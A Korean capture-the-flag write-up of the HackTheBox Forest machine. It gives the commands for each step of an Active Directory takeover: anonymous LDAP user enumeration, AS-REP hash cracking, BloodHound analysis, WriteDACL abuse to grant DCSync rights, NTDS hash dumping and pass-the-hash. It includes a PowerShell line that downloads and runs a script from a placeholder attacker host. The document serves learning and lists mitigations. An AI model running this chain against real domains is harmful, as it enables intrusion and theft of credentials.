@@ -1,0 +1,287 @@
+<h1 id="section-1">HackTheBox 라이트업 - Forest</h1>
+<blockquote>
+<p>Active Directory / Anonymous LDAP / AS-REP Roasting / BloodHound / WriteDACL / DCSync</p>
+</blockquote>
+<hr>
+<h2 id="section-2">1. 개요</h2>
+<p>HTB Forest는 도메인 컨트롤러가 직접 노출된 Active Directory 머신이다. 정찰 단계에서 DNS, Kerberos, LDAP, SMB, Global Catalog, WinRM이 함께 열려 있어 AD 환경임을 확인할 수 있었다.</p>
+<p>공격 흐름은 익명 LDAP/SMB 열거로 사용자 목록을 확보하고, Kerberos 사전 인증이 꺼진 계정을 대상으로 AS-REP Roasting을 수행한 뒤, BloodHound로 ACL 기반 권한 경로를 분석하는 방식이었다. 최종적으로 <code>GenericAll</code>과 <code>WriteDACL</code> 경로를 이용해 DCSync 권한을 부여하고 도메인 계정 해시를 덤프했다.</p>
+<p>이 문제에서 가장 많이 배운 점은 BloodHound 그래프를 “결과 화면”으로만 보는 것이 아니라, 각 edge가 실제 어떤 PowerShell 명령과 권한 변경으로 이어지는지 해석해야 한다는 점이었다.</p>
+<p>민감한 IP, 비밀번호, 해시, flag는 포트폴리오용으로 익명화했다.</p>
+<hr>
+<h2 id="section-3">2. 대상 / 환경</h2>
+<div class="table-scroll"><table>
+<thead>
+<tr>
+<th>항목</th>
+<th>내용</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>머신</td>
+<td>HackTheBox Forest</td>
+</tr>
+<tr>
+<td>OS</td>
+<td>Windows Server 2016</td>
+</tr>
+<tr>
+<td>도메인</td>
+<td><code>htb.local</code></td>
+</tr>
+<tr>
+<td>호스트명</td>
+<td><code>FOREST.htb.local</code></td>
+</tr>
+<tr>
+<td>주요 서비스</td>
+<td>DNS, Kerberos, LDAP, SMB, WinRM</td>
+</tr>
+<tr>
+<td>핵심 흐름</td>
+<td>Anonymous LDAP -&gt; AS-REP Roasting -&gt; WriteDACL -&gt; DCSync</td>
+</tr>
+</tbody></table></div>
+<hr>
+<h2 id="section-4">3. 공격 경로 요약</h2>
+<pre><code class="language-text">Nmap 스캔으로 도메인 컨트롤러 식별
+-&gt; SMB/LDAP 익명 접근 가능성 확인
+-&gt; LDAP null session으로 사용자 목록 수집
+-&gt; AS-REP Roasting 대상 확인
+-&gt; svc-alfresco AS-REP 해시 획득
+-&gt; hashcat으로 비밀번호 크랙
+-&gt; Evil-WinRM으로 초기 shell 획득
+-&gt; BloodHound로 ACL 경로 분석
+-&gt; svc-alfresco를 Exchange Windows Permissions 그룹에 추가
+-&gt; WriteDACL로 DCSync 권한 부여
+-&gt; secretsdump/netexec로 NTDS 해시 덤프
+-&gt; Administrator Pass-the-Hash
+</code></pre>
+<hr>
+<h2 id="section-5">4. 정찰</h2>
+<h3 id="section-6">4.1 Nmap</h3>
+<pre><code class="language-bash">nmap -Pn -n -sC -sV -p- --min-rate 5000 IP -oA forest_full
+</code></pre>
+<p>주요 포트:</p>
+<div class="table-scroll"><table>
+<thead>
+<tr>
+<th>포트</th>
+<th>서비스</th>
+<th>분석</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>53</td>
+<td>DNS</td>
+<td>도메인 컨트롤러 가능성</td>
+</tr>
+<tr>
+<td>88</td>
+<td>Kerberos</td>
+<td>AS-REP Roasting / Kerberoasting 확인</td>
+</tr>
+<tr>
+<td>135/593</td>
+<td>RPC</td>
+<td>Windows AD 관리 인터페이스</td>
+</tr>
+<tr>
+<td>139/445</td>
+<td>SMB</td>
+<td>null session, 공유, OS 정보</td>
+</tr>
+<tr>
+<td>389/636</td>
+<td>LDAP/LDAPS</td>
+<td>사용자, 그룹, 정책 열거</td>
+</tr>
+<tr>
+<td>3268/3269</td>
+<td>Global Catalog</td>
+<td>AD 포리스트 검색</td>
+</tr>
+<tr>
+<td>5985</td>
+<td>WinRM</td>
+<td>계정 획득 후 PowerShell 접근 가능성</td>
+</tr>
+</tbody></table></div>
+<p>SMB 스크립트 결과에서 <code>FOREST</code>, <code>htb.local</code>, <code>FOREST.htb.local</code> 정보를 확인했다. SMB signing은 required였기 때문에 relay보다는 사용자 열거와 Kerberos 기반 공격에 초점을 맞췄다.</p>
+<hr>
+<h2 id="section-7">5. 익명 LDAP / SMB 열거</h2>
+<p>스캔 결과에서 <code>account_used: &lt;blank&gt;</code>가 보였고, 익명 접근 가능성을 확인했다. AD에서는 사용자 이름만 확보해도 AS-REP Roasting, Password Spray, Kerberoasting 등으로 이어질 수 있으므로 사용자 목록 수집을 먼저 진행했다.</p>
+<pre><code class="language-bash">netexec ldap IP -u '' -p '' --users | tee users_raw.txt
+cat users_raw.txt | tr -s ' ' | cut -d ' ' -f 5 | sort -u &gt; users.txt
+</code></pre>
+<p>대체 방법:</p>
+<pre><code class="language-bash">ldapsearch -x -H ldap://IP -b "DC=htb,DC=local" \
+  "(&amp;(objectClass=user))" sAMAccountName
+</code></pre>
+<p>주요 계정 후보:</p>
+<pre><code class="language-text">svc-alfresco
+andy
+mark
+santi
+</code></pre>
+<p><img src="assets/reports/htb-forest/01-anonymous-ldap-users.png" alt="익명 LDAP 사용자 열거" loading="lazy"></p>
+<p>이 단계는 단순 정보 수집이 아니라 공격 경로의 시작점이었다. 사용자 목록이 있어야 Kerberos 기반 공격과 BloodHound 수집으로 이어질 수 있기 때문이다.</p>
+<hr>
+<h2 id="section-8">6. AS-REP Roasting</h2>
+<p>사용자 목록을 확보한 뒤, Kerberos 사전 인증이 꺼진 계정이 있는지 확인했다.</p>
+<pre><code class="language-bash">impacket-GetNPUsers htb.local/ -usersfile users.txt \
+  -outputfile asreproast.hash -dc-ip IP
+</code></pre>
+<p>결과:</p>
+<pre><code class="language-text">$krb5asrep$23$svc-alfresco@HTB.LOCAL:...
+</code></pre>
+<p>hashcat 18200 모드로 크랙했다.</p>
+<pre><code class="language-bash">hashcat -m 18200 -a 0 asreproast.hash /usr/share/wordlists/rockyou.txt
+</code></pre>
+<p>결과:</p>
+<pre><code class="language-text">svc-alfresco:CRACKED_PASSWORD
+</code></pre>
+<p><img src="assets/reports/htb-forest/02-asrep-crack-redacted.png" alt="AS-REP 해시 크랙 결과" loading="lazy"></p>
+<p>AS-REP Roasting은 사전 인증이 꺼진 계정이 있을 때 비밀번호 없이도 오프라인 크랙 가능한 해시를 얻는 공격이다. Forest에서는 이 한 설정 실수가 초기 인증 획득으로 이어졌다.</p>
+<hr>
+<h2 id="section-9">7. 초기 접근</h2>
+<p>크랙한 계정이 SMB와 WinRM에서 유효한지 확인했다.</p>
+<pre><code class="language-bash">netexec smb IP -u svc-alfresco -p 'CRACKED_PASSWORD'
+evil-winrm -i IP -u svc-alfresco -p 'CRACKED_PASSWORD'
+</code></pre>
+<p>WinRM이 열려 있었기 때문에 PowerShell 세션을 획득할 수 있었다. 하지만 이 계정은 바로 Domain Admin이 아니었고, BloodHound를 통한 권한 경로 분석이 필요했다.</p>
+<hr>
+<h2 id="section-10">8. BloodHound 수집과 경로 분석</h2>
+<p>Linux에서 BloodHound 수집을 수행했다.</p>
+<pre><code class="language-bash">bloodhound-python -u svc-alfresco -p 'CRACKED_PASSWORD' -d htb.local \
+  -c All -dc forest.htb.local -ns IP --zip
+</code></pre>
+<p>발견한 주요 경로:</p>
+<pre><code class="language-text">SVC-ALFRESCO@HTB.LOCAL
+-&gt; MemberOf: ACCOUNT OPERATORS
+
+ACCOUNT OPERATORS
+-&gt; GenericAll: EXCHANGE WINDOWS PERMISSIONS
+
+EXCHANGE WINDOWS PERMISSIONS
+-&gt; WriteDACL: HTB.LOCAL domain object
+</code></pre>
+<p>권한 해석:</p>
+<pre><code class="language-text">GenericAll
+-&gt; 대상 그룹/객체에 대해 광범위한 제어 가능
+
+WriteDACL
+-&gt; 대상 객체의 ACL 수정 가능
+
+DCSync
+-&gt; 도메인 복제 권한을 부여하면 NTDS 해시 덤프 가능
+</code></pre>
+<p><img src="assets/reports/htb-forest/03-bloodhound-writedacl-path.png" alt="BloodHound WriteDACL 경로" loading="lazy"></p>
+<p>이 경로는 <code>svc-alfresco</code>가 직접 Domain Admin은 아니지만, 그룹 멤버십과 ACL 조작을 통해 DCSync 권한을 자기 자신에게 부여할 수 있음을 보여준다.</p>
+<hr>
+<h2 id="section-11">9. PowerView 로드</h2>
+<p>Evil-WinRM 세션에서 PowerView를 로드했다.</p>
+<pre><code class="language-powershell">iex (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:PORT/PowerView.ps1')
+</code></pre>
+<p>또는 파일을 업로드한 뒤 dot sourcing으로 로드할 수 있다.</p>
+<pre><code class="language-powershell">upload PowerView.ps1
+. .\PowerView.ps1
+</code></pre>
+<p>PowerView는 AD 그룹 멤버십 변경, ACL 조회/수정, 권한 경로 검증에 사용했다.</p>
+<hr>
+<h2 id="section-12">10. Exchange Windows Permissions 그룹 추가</h2>
+<p>BloodHound 경로에 따라 <code>svc-alfresco</code>를 <code>Exchange Windows Permissions</code> 그룹에 추가했다.</p>
+<pre><code class="language-powershell">Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco
+</code></pre>
+<p>의미:</p>
+<pre><code class="language-text">svc-alfresco가 Account Operators 권한을 통해
+Exchange Windows Permissions 그룹에 자기 자신을 추가
+-&gt; 해당 그룹은 도메인 객체에 WriteDACL 보유
+-&gt; svc-alfresco가 도메인 ACL 수정 가능 상태가 됨
+</code></pre>
+<hr>
+<h2 id="section-13">11. WriteDACL로 DCSync 권한 부여</h2>
+<p>인증 객체를 생성한 뒤, 도메인 객체에 DCSync 권한을 부여했다.</p>
+<pre><code class="language-powershell">$pass = ConvertTo-SecureString 'CRACKED_PASSWORD' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('htb\svc-alfresco', $pass)
+
+Add-DomainObjectAcl -Credential $cred `
+  -PrincipalIdentity svc-alfresco `
+  -TargetIdentity 'DC=htb,DC=local' `
+  -Rights DCSync
+</code></pre>
+<p>DCSync는 도메인 컨트롤러의 복제 권한을 흉내 내 계정 해시를 요청하는 공격이다. Domain Admin shell이 없어도 복제 권한만 있으면 도메인 전체 계정 해시 덤프로 이어질 수 있다.</p>
+<hr>
+<h2 id="section-14">12. NTDS 해시 덤프</h2>
+<p>DCSync 권한을 부여한 뒤 <code>secretsdump</code> 또는 <code>netexec --ntds</code>로 해시를 덤프했다.</p>
+<pre><code class="language-bash">impacket-secretsdump htb.local/svc-alfresco:'CRACKED_PASSWORD'@IP
+</code></pre>
+<p>또는:</p>
+<pre><code class="language-bash">netexec smb IP -u svc-alfresco -p 'CRACKED_PASSWORD' --ntds
+</code></pre>
+<p>결과에서 Administrator NTLM 해시를 확인했다.</p>
+<pre><code class="language-text">Administrator:500:&lt;lm_hash&gt;:&lt;ntlm_hash&gt;:::
+</code></pre>
+<hr>
+<h2 id="section-15">13. Pass-the-Hash</h2>
+<p>Administrator 해시로 WinRM 인증을 수행했다.</p>
+<pre><code class="language-bash">netexec smb IP -u administrator -H ADMINISTRATOR_NTLM_HASH
+evil-winrm -i IP -u administrator -H ADMINISTRATOR_NTLM_HASH
+</code></pre>
+<p>권한 확인:</p>
+<pre><code class="language-powershell">whoami
+hostname
+</code></pre>
+<p><img src="assets/reports/htb-forest/04-admin-winrm-redacted.png" alt="관리자 WinRM 접근 확인" loading="lazy"></p>
+<p>포트폴리오에는 관리자 해시와 flag를 공개하지 않고, 권한 상승이 실제로 이어졌다는 흐름만 보여준다.</p>
+<hr>
+<h2 id="section-16">14. 영향도</h2>
+<div class="table-scroll"><table>
+<thead>
+<tr>
+<th>구분</th>
+<th>내용</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>초기 정보 노출</td>
+<td>익명 LDAP/SMB로 도메인 사용자 목록 수집 가능</td>
+</tr>
+<tr>
+<td>초기 침투</td>
+<td>AS-REP Roasting으로 서비스 계정 비밀번호 크랙</td>
+</tr>
+<tr>
+<td>권한 상승</td>
+<td>GenericAll + WriteDACL 경로로 DCSync 권한 획득</td>
+</tr>
+<tr>
+<td>최종 영향</td>
+<td>Administrator NTLM 해시 획득 및 도메인 장악</td>
+</tr>
+<tr>
+<td>파급 범위</td>
+<td>도메인 내 계정 해시 복제 가능</td>
+</tr>
+</tbody></table></div>
+<hr>
+<h2 id="section-17">15. 대응 방안</h2>
+<ul>
+<li>LDAP/SMB 익명 열거를 차단하고 null session 정책을 점검한다.</li>
+<li>모든 계정에서 <code>Do not require Kerberos preauthentication</code> 설정을 비활성화한다.</li>
+<li>서비스 계정에는 긴 무작위 비밀번호 또는 gMSA를 적용한다.</li>
+<li>Kerberos 이벤트 ID 4768에서 사전 인증 없는 TGT 요청을 모니터링한다.</li>
+<li>Account Operators, Exchange Windows Permissions 같은 고위험 그룹 멤버십을 정기 감사한다.</li>
+<li>BloodHound로 <code>GenericAll</code>, <code>WriteDACL</code>, <code>DCSync</code> 경로를 주기적으로 점검한다.</li>
+<li>Directory Service Access 이벤트 ID 4662와 복제 권한 사용 이벤트를 모니터링한다.</li>
+</ul>
+<hr>
+<h2 id="section-18">16. 학습한 점</h2>
+<ul>
+<li>AD에서는 사용자 이름만 확보해도 Kerberos 기반 공격으로 이어질 수 있다.</li>
+<li>Nmap에서 Kerberos/LDAP/SMB/GC/WinRM이 함께 보이면 도메인 컨트롤러 관점으로 해석해야 한다.</li>
+<li>AS-REP Roasting은 단일 계정 설정 실수가 초기 침투로 이어지는 대표적인 AD 취약점이다.</li>
+<li>BloodHound edge는 그래프가 아니라 실제 권한 행위로 해석해야 한다.</li>
+<li>DCSync는 관리자 로그인 없이도 복제 권한만으로 도메인 전체 계정 해시 덤프로 이어질 수 있다.</li>
+<li>Forest는 명령어 하나보다 “사용자 열거 -&gt; Kerberos 공격 -&gt; BloodHound 분석 -&gt; ACL 조작”을 순서대로 이해하는 것이 핵심이었다.</li>
+</ul>
